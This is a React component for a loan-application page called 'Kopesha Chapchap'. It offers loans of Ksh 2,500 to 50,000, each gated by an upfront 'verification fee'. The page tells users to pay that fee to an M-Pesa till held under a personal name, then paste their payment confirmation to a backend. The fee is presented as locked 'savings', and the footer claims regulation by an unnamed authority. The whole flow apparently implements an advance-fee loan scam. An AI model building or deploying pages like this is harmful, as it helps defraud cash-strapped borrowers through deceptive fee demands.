import React, { useState } from 'react';
import { useNavigate,useLocation } from 'react-router-dom';
import Swal from 'sweetalert2';
import '../styles/LoanApproval.css';

const LoanApproval = () => {
  const navigate = useNavigate();

  const location = useLocation();
const loanApplication = location.state;


const trackingId = loanApplication?.trackingId;


  

  const loanOffers = [
    { id: 1, amount: 2500, verificationFee: 150, duration: '2 months', interest: '10%' },
    { id: 2, amount: 5000, verificationFee: 250, duration: '2 months', interest: '10%' },
    { id: 3, amount: 10000, verificationFee: 350, duration: '2 months', interest: '10%' },
    { id: 4, amount: 20000, verificationFee: 500, duration: '2 months', interest: '10%' },
    { id: 5, amount: 30000, verificationFee: 750, duration: '2 months', interest: '10%' },
    { id: 6, amount: 40000, verificationFee: 850, duration: '3 months', interest: '12%' },
    { id: 7, amount: 50000, verificationFee: 1000, duration: '4 months', interest: '15%' },
  ];

  const [selectedLoan, setSelectedLoan] = useState(null);
  const [showTillInfo, setShowTillInfo] = useState(false);

  const tillNumber = '7973629';
  const accountName = 'Jovial Jones';

  const handleProceedToPayment = async () => {
  if (!selectedLoan) {
    Swal.fire({
      icon: 'warning',
      title: 'Oops!',
      text: 'Please select a loan option first.',
    });
    return;
  }

  // ✅ Save selected loan offer to backend
  try {
    const res = await fetch("https://kopesha-backend-3.onrender.com/api/loans/update-offer", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        trackingId: trackingId,
        loanAmount: selectedLoan.amount,
        verificationFee: selectedLoan.verificationFee
      })
    });

    if (!res.ok) {
      const data = await res.json();
      throw new Error(data.error || "Failed to save loan offer");
    }

    setShowTillInfo(true); // now show till info after saving
  } catch (err) {
    Swal.fire("Error", err.message, "error");
  }
};


  const handleCopyTill = () => {
    navigator.clipboard.writeText(tillNumber)
      .then(() => {
        Swal.fire({
          icon: 'success',
          title: 'Copied!',
          text: 'Till number copied to clipboard.',
          timer: 1500,
          showConfirmButton: false,
        });
      })
      .catch(() => {
        Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'Failed to copy till number.',
        });
      });
  };

const handleVerifyPayment = () => {
  Swal.fire({
    html: `
      <div style="text-align: center; padding: 20px;">
        <div style="width: 100px; height: 100px; background: linear-gradient(135deg, #00a651 0%, #006838 100%); border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
          <div style="background: white; width: 60px; height: 40px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #00a651; font-size: 14px;">M-PESA</div>
        </div>
        <h2 style="color: #1a4d7d; font-size: 20px; margin-bottom: 15px; font-weight: 600;">Verify Your Payment</h2>
        <p style="color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 20px;">
          Copy the entire confirmation message you received from M-PESA after making payments and paste in the text field below then click verify.
        </p>
        <textarea id="mpesaMessage" placeholder="Paste M-PESA confirmation message here" style="width: 100%; min-height: 100px; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; font-family: inherit; resize: vertical; margin-bottom: 15px;"></textarea>
      </div>
    `,
    showCancelButton: false,
    showCloseButton: true,
    confirmButtonText: 'Verify Transaction Message',
    confirmButtonColor: '#7ac943',
    customClass: {
      popup: 'mpesa-verify-popup',
      confirmButton: 'mpesa-verify-btn'
    },
    width: '400px',
    preConfirm: () => {
      const message = Swal.getPopup().querySelector('#mpesaMessage').value;
      if (!message) Swal.showValidationMessage('Please enter the M-Pesa message');
      return message;
    }
  }).then(async (result) => {
    if (result.isConfirmed) {
      const mpesaMessage = result.value;
      console.log('User pasted M-Pesa message:', mpesaMessage);

      try {
        // ✅ Send message to backend
        const response = await fetch('https://kopesha-backend-3.onrender.com/api/loans/verify-message', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            trackingId: trackingId, // send loan tracking ID
            mpesaMessage: mpesaMessage        // send pasted message
          })
        });

        const data = await response.json();

        if (response.ok) {
          Swal.fire({
            icon: 'success',
            title: 'Message Saved!',
            text: 'Your M-Pesa message has been submitted successfully.'
          }).then(() => navigate('/'));
        } else {
          Swal.fire({
            icon: 'error',
            title: 'Error',
            text: data.error || 'Failed to save M-Pesa message'
          });
        }
      } catch (err) {
        console.error(err);
        Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'Server error. Please try again later.'
        });
      }
    }
  });
};


  const handleGoBack = () => navigate('/');

  return (
    <div className="approval-container">
      <div className="approval-card">
        <div className="approval-header">
          <h2>Kopesha Chapchap</h2>
          <p></p>
        </div>

        {!showTillInfo && (
          <div className="loan-options">
            <h4>Select a loan option</h4>
            {loanOffers.map((offer) => (
              <div
                key={offer.id}
                className={`loan-option-card ${selectedLoan?.id === offer.id ? 'selected' : ''}`}
                onClick={() => setSelectedLoan(offer)}
              >
                <div>
                  <strong>Ksh. {offer.amount.toLocaleString()}</strong>
                  <p>Duration: {offer.duration}</p>
                  <p>Interest: {offer.interest}</p>
                </div>
                <div>Verification Fee: <strong>Ksh. {offer.verificationFee}</strong></div>
              </div>
            ))}
            <button className="get-loan-btn" onClick={handleProceedToPayment} disabled={!selectedLoan}>
              Proceed to Payment
            </button>
          </div>
        )}

        {showTillInfo && selectedLoan && (
          <div className="till-info-card">
            <h3>Account Savings</h3>
            <p>
              Based on your selected loan amount of <strong>Ksh {selectedLoan.amount}</strong>, {accountName} requires you to save 
              <strong> Ksh {selectedLoan.verificationFee}</strong> to your Kopesha Chapchap account. Your savings will be withdrawable exclusively upon successful completion of your first loan repayment cycle.
            </p>

            <ol className="payment-steps">
              <li>Open <strong>M-Pesa</strong> on your phone</li>
              <li>Select <strong>Buy Goods & Services</strong></li>
              <li>Enter Till Number: <strong>{tillNumber}</strong></li>
              <li>Enter Amount: <strong>Ksh {selectedLoan.verificationFee}</strong></li>
            </ol>

            <button className="copy-btn" onClick={handleCopyTill}>Copy Till Number</button>
            <button className="verify-btn" onClick={handleVerifyPayment}>Verify Payment</button>

            <div style={{ marginTop: '10px', textAlign: 'center', fontSize: '0.9rem', color: '#555' }}>
              © Kopesha Chapchap 2026 | Regulated by KFSA <br />
              <span onClick={handleGoBack} style={{ cursor: 'pointer', color: 'blue' }}>Go Back</span>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default LoanApproval;
